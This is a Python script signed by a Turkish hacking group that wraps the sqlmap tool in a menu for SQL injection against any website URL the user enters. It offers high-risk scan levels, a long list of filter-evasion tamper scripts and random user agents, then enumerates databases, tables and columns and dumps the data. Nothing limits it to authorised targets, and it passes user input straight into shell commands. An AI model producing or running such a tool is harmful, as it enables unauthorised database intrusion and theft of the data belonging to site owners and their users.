# TURKHACKTEAM ~ K3D

from datetime import time
import os
from time import sleep

# Konsolu Temizleyelim
os.system("color a")
os.system("cls")

while(True):
    islem = input("""
                                    CODED BY TURKHACKTEAM ~ K3D
        
        1-) Normal [DBS]
        2-) Orta [LEVEL / RİSK / DBS / BATCH]
        3-) Yüksek [TAMPER / LEVEL / RİSK / DBS / BATCH]
        4-) Karışma Bende [RANDOM AGENT / TAMPER / LEVEL / RİSK / DBS / BATCH]

        DATA BİLGİLERİ VAR İSE

        5-) DB Bilgi
        6-) Tablo Bilgi
        7-) Column Bilgi
        8-) Verileri Çek Anasını Satıyım
    
    """)

    yol = "C:\\Users\\Casper\\AppData\\Local\\Programs\\Python\\Python39\\sqlmap" # Sisteminize Göre Ayarlayınız.

    if islem == "1":
        link = str(input("Lütfen Site Adresi Girin: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link} --dbs")
    elif islem == "2":
        link2 = str(input("Lütfen Site Adresi Girin: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link2} --level=5 --risk=3 --batch --dbs")
    elif islem == "3":
        link3 = str(input("Lütfen Site Adresi Girin: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link3} --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor --level=5 --risk=3 --batch --dbs")
    elif islem == "4":
        link4 = str(input("Lütfen Site Adresi Girin: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link4} --random-agent --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor --level=5 --risk=3 --batch --dbs")
    elif islem == "5":
        link5 = str(input("Lütfen Site Adresi Girin: "))
        data_isim1 = str(input("Lütfen Data İsmi Giriniz: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link5} --batch -D {data_isim1} --tables")
    elif islem == "6":
        link6 = str(input("Lütfen Site Adresi Girin: "))
        data_isim2 = str(input("Lütfen Data İsmi Giriniz: "))
        table_ismi1 = str(input("Lütfen Table İsmi Giriniz: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link6} --batch -D {data_isim2} -T {table_ismi1} --columns")
    elif islem == "7":
        link7 = str(input("Lütfen Site Adresi Girin: "))
        data_isim3 = str(input("Lütfen Data İsmi Giriniz: "))
        table_ismi2 = str(input("Lütfen Table İsmi Giriniz: "))
        column_ismi1 = str(input("Lütfen Column İsmi Giriniz: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link7} --batch -D {data_isim3} -T {table_ismi2} -C {column_ismi1}")
    elif islem == "8":
        link8 = str(input("Lütfen Site Adresi Girin: "))
        data_isim4 = str(input("Lütfen Data İsmi Giriniz: "))
        table_ismi3 = str(input("Lütfen Table İsmi Giriniz: "))
        column_ismi2 = str(input("Lütfen Column İsmi Giriniz: "))
        sleep(2)
        os.chdir(yol)
        os.system(f"sqlmap.py -u {link8} --batch -D {data_isim4} -T {table_ismi3} -C {column_ismi2} --dump")
    else:
        print("Hatalı Bir İşlem Yapmadığına Emin misin?")
